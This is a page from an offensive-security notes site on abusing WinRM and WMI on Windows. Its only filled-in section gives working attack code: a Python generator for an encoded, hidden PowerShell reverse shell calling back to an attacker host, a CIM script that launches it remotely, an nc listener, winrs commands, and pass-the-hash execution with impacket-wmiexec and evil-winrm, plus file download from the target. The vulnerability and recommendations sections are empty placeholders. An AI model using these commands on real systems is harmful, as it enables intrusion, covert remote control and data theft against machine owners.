---
layout: default
title: WinRM Abuse
parent: Windows
nav_order: 13
permalink: /windows/winrm/
---

# WinRM Abuse
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

TODO: Describe the vulnerability here.

## Prerequisites

* Low-privileged account on your target.
* WinRM service enabled on your target (default port is 5985).

## Exploit

To launch an executable on the target machine, you can use `wmic`. For example, to start the Windows calculator.

```bash
# From Windows.
wmic /node:$target /user:'$username' /password:'$password' process call create "calc"

# From Kali.
wmic -U '$username'%'$password' //$target "process call create calc"
```

Unfortunately, `wmic` is considered deprecated on modern Windows versions. Nevertheless, here is a way to translate this attack with PowerShell. First, you will need a reverse shell written in PowerShell. To do so, use following Python script.

```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("$lhost",$lport);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

Execute the Python script above and copy the output. You can now prepare the PowerShell script that will transmit and execute the payload on the target machine.

```powershell
$username = 'user';
$password = 'password';
$target = 'computer'
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName $target -Credential $credential -SessionOption $options 
$command = '<OUTPUT_OF_THE_PREVIOUS_PYTHON_SCRIPT>';
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $command};
```

Don’t forget to listen on the appropriate port on the Kali.

```bash
nc -lnvp $lport
```

It’s also possible to execute commands remotely through WinRM.

```bash
# From a domain joined computer.
winrs -r:$target -u:$username -p:$password "$command"

# Also possible via PowerShell.
New-PSSession -ComputerName $target -Credential $credential
Enter-PSSession $id
```

Finally, this exploit is also possible directly from Kali with impacket or evil-winrm.

```bash
impacket-wmiexec -hashes :$nt $username@$target
impacket-wmiexec -hashes 00000000000000000000000000000000:$nt $username@$target

evil-winrm -i $target -u $username -H $nt
```

{: .important }
> You can leverage evil-winrm to remotely download file from your target by invoking `download $path` command.

## Recommendations

- [ ] TODO: List recommendations here.